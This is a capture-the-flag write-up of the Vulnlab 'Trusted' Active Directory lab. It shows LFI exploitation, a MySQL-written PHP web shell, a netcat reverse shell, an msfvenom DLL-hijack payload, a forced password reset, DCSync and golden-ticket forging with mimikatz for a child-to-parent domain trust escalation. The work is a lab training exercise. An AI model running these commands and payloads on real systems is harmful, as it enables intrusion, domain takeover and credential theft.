# Vulnlab - Trusted

# 10.10.212.5

## NMAP

```bash
Nmap scan report for 10.10.212.5                                       
Host is up (0.097s latency).                       
Not shown: 65509 closed tcp ports (reset)          
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus                         
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-19 17:35:47Z)                    
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-19T17:37:17+00:00; +38s from scanner time.
| ssl-cert: Subject: commonName=trusteddc.trusted.vl
| Issuer: commonName=trusteddc.trusted.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-21T14:47:57
| Not valid after:  2023-10-21T14:47:57
| MD5:   45ea20be5e4bca32c9fc20b0d2c3801a
|_SHA-1: 46afd9e24c5f561f7de1089a8038b9f856db4b8a
| rdp-ntlm-info: 
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-06-19T17:37:01+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

# 10.10.212.6

## NMAP

```bash
Nmap scan report for 10.10.212.6
Host is up (0.088s latency).                  
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.212.6/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| http-methods:                
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-19 17:35:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn          
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: Welcome to XAMPP                            
|_Requested resource was https://10.10.212.6/dashboard/
| tls-alpn:                                
|_  http/1.1                                       
|_ssl-date: TLS randomness does not represent time 
| ssl-cert: Subject: commonName=localhost          
| Issuer: commonName=localhost                     
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
|_SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3306/tcp  open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-19T17:37:17+00:00; +39s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-06-19T17:37:03+00:00
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
| Issuer: commonName=labdc.lab.trusted.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-21T14:48:14
| Not valid after:  2023-10-21T14:48:14
| MD5:   6b0e83e111daedeaeec7494630f036f6
|_SHA-1: 3b251ec4daa9f35d915589b7f6bb59fc071707c8
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

## PORT 445 (SMB)

Performing null authentication on SMB didn't showed any shares as well

<img src="https://i.imgur.com/BMkD1Fn.png"/>

## PORT 389 (LDAP)

On ldap, performing null authentication didn't worked as well

<img src="https://i.imgur.com/xGpECGm.png"/>


## PORT 80/443 (HTTP/HTTPS)

The webserver had XAMPP running

<img src="https://i.imgur.com/D27sfHT.png"/>

Fuzzing for files with gobuster it showed `/dev`

<img src="https://i.imgur.com/dESsicF.png"/>

<img src="https://i.imgur.com/Z82xruj.png"/>

On visiting any of the pages, it's going to take the html page name as a GET parameter `view`

<img src="https://i.imgur.com/MPFl72z.png"/>

So here we can try Local File Inclusion (LFI) to see if any of the local files get included

```bash
http://10.10.212.6/dev/index.html?view=C:/WINDOWS/System32/drivers/etc/hosts
```

<img src="https://i.imgur.com/RqXHXIJ.png"/>

We can check the source of index.html file by using `php://filter` to encode the file contents in base64 as it might have php code which gets executed if it's in plain text

<img src="https://i.imgur.com/rBZHZVv.png"/>

<img src="https://i.imgur.com/hoHn1Rm.png"/>

At the bottom we can see why we were able to include local files, as it's using `include` on GET parameter and accepting files. secondly we see a comment for Eric which talks about setting up database connection, on trying to fuzz for php files, we get `db.php`

<img src="https://i.imgur.com/BuvetNm.png"/>

From here we can get credentials to mysql

<img src="https://i.imgur.com/WkHXFoE.png"/>

<img src="https://i.imgur.com/suIMVgB.png"/>
With these credentials we can login to mysql

<img src="https://i.imgur.com/lRo2kbO.png"/>

With `news` database, we can query for `users` table

<img src="https://i.imgur.com/Lg6KCZV.png"/>

Here we can find three usernames, out of which `rsmith`'s hash was cracked

<img src="https://i.imgur.com/ZnavjbQ.png"/>

On trying to crack these hashes with Crackstation

<img src="https://i.imgur.com/8U7eBPg.png"/>

We can check if these credentials works on the target machine with `crackmapexec`

<img src="https://i.imgur.com/hzdjViw.png"/>

Checking the shares, there's wasn't any interesting share

<img src="https://i.imgur.com/KvLSpN5.png"/>

## Un-Intended (SYSTEM)

Going back to mysql, since we are root user, we may have file and write privilege, we can create a php file to execute system commands through GET parameter

```mysql
select "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/dev/shell.php';
```

<img src="https://i.imgur.com/RO43VvN.png"/>

<img src="https://i.imgur.com/WlzHmAu.png"/>

Transferring `nc.exe` by setting up a python server to host the file

```powershell
curl http://10.8.0.136/nc64.exe -o C:/Windows/Temp/nc.exe
```


<img src="https://i.imgur.com/CYqtoWW.png"/>

Now executing it while having our netcat listener ready

```powershell
C:/Windows/Temp/nc.exe 10.8.0.136 2222 -e cmd.exe
```

<img src="https://i.imgur.com/w5OCEcC.png"/>

## Intended (ewalters)

I wasn't able to run `python-bloodhound`, not sure what was the issue, since we have SYSTEM user on LABDC, I decided to enumerate `lab.trusted.vl` domain with sharphound.exe by downloading it through our python server

<img src="https://i.imgur.com/4ust9x8.png"/>

We can then download this through evil-winrm, since we have the administrator hash from the dump

<img src="https://i.imgur.com/rlCFB4N.png"/>

Running bloodhound on the json files we got from sharphound, we can see a path from `rsmith` to `ewalters` by having `ForceChangePassword` ACL on ewalters, we can change the password and login by either WinRM or RDP since it has `CanPSRemote` permissions on the host 

<img src="https://i.imgur.com/7ANfiBB.png"/>

Through `rpcclient`, ewalters's password can be changed

```bash
setuserinfo2 ewalters 23 'Ewwalter@123456'
```

<img src="https://i.imgur.com/HORXjoP.png"/>

With cme we can verify if the password is actually updated and we can login through WinRM

<img src="https://i.imgur.com/PYst5Z9.png"/>

<img src="https://i.imgur.com/gszCpfd.png"/>

In `C:/` drive, there was a folder `AVTest` which had `readme.txt` talking about Christine to run AV tools

<img src="https://i.imgur.com/LOh1ZPQ.png"/>

Using `smbserver.py` to transfer `KasperskyRemovalTool.exe`

<img src="https://i.imgur.com/L1DHLQD.png"/>
<img src="https://i.imgur.com/Cmkq6QJ.png"/>

<img src="https://i.imgur.com/GG6A2nI.png"/>

## Privilege Escalation (cpowers)

Transferring the exe on windows machine and running  `Process Monitor/Procmon` to analyze which DLL is being loaded by this exe, on launching procmon, it's going to capture all system events

<img src="https://i.imgur.com/I6udiIF.png"/>

Running `KasperskyRemovalTool.exe` to make sure it's events gets logged 

<img src="https://i.imgur.com/DFNIdc2.png"/>

Hit `ctrl+E` to stop capturing for system events and apply filters to only display kaspersky process

<img src="https://i.imgur.com/UFcZZfy.png"/>

First applying the filter for `KasperskyRemovalTool` process name

<img src="https://i.imgur.com/OFcP8pt.png"/>

Next adding the filter for the dll files

<img src="https://i.imgur.com/3UYgNc0.png"/>

Lastly for dlls which are not found, Here we'll see `KasperskyRemovalToolENU.dll`
being loaded, so we need to create 32 bit DLL since the exe is in PE32 format

<img src="https://i.imgur.com/1oc42AY.png"/>

<img src="https://i.imgur.com/Zml2plQ.png"/>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.136 LPORT=2222 -f dll > KasperskyRemovalToolENU.dll
```

<img src="https://i.imgur.com/pak3uR1.png"/>

Transferring the dll file and putting it in `C:/AVTest` as the dll was being loaded from the same location from where the exe was being executed

<img src="https://i.imgur.com/PVBDuAq.png"/>

Now wait for few seconds for the exe to be triggered which will execute our malicious dll and we'll get a shell as `cpowers`

<img src="https://i.imgur.com/rrSSqSb.png"/>

This user was a member of `domain admin` , so we have complete access on the first machine

<img src="https://i.imgur.com/UpuNwjk.png"/>

## Privilege Escalation (Enterprise Admin)

We can enumerate the trust between `labdc.trusted.vl` and `trusted.vl`

```powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

nltest.exe /trusted_domains
```

<img src="https://i.imgur.com/fTHtEGb.png"/>

Following this article, we can abuse this child->parent domain trust relationship and escalate to enterprise domain, in order to do this we need the krbtgt hash of lab.trusted.vl and the SIDs of both domains, then with mimikatz we can forge a golden ticket for the enterprise domain admin

```powershell
lsadump::dcsync /domain:lab.trusted.vl /all
```

Dumping ntds.dit to get the krbtgt hash by using `mimikatz`

<img src="https://i.imgur.com/PxtLs80.png"/>

<img src="https://i.imgur.com/o7yrpMl.png"/>

Getting the domain SID of lab.trusted.vl and trusted.vl by running `lsadump::trust /patch`

<img src="https://i.imgur.com/GMpXiqM.png"/>

Now forging a ticket for enterprise domain admin

```powershell
kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```

<img src="https://i.imgur.com/pjFTMix.png"/>

All that is left is to dump ntds from trusted.vl domain 

```powershell
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```

<img src="https://i.imgur.com/WA4XVkM.png"/>

<img src="https://i.imgur.com/fPNDmJT.png"/>

Having the administrator's hash from trusted.vl, we can login through WinRM and complete this AD chain.

<img src="https://i.imgur.com/floQbIF.png"/>

Even tho we are administrator on the machine, the flag wasn't still readable as it was giving access denied

<img src="https://i.imgur.com/ef5CBdk.png"/>

Here I had to login as the administrator by changing his password and then grabbing the flag

<img src="https://i.imgur.com/qHuT2Kx.png"/>


## References

- https://github.com/aniqfakhrul/powerview.py
- https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
- https://medium.com/techzap/dll-hijacking-part-1-basics-b6dfb8260cf1
- https://redteamtechniques.github.io/Windows%20%26%20AD%20Hacking/Lab%20Attacks/Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/

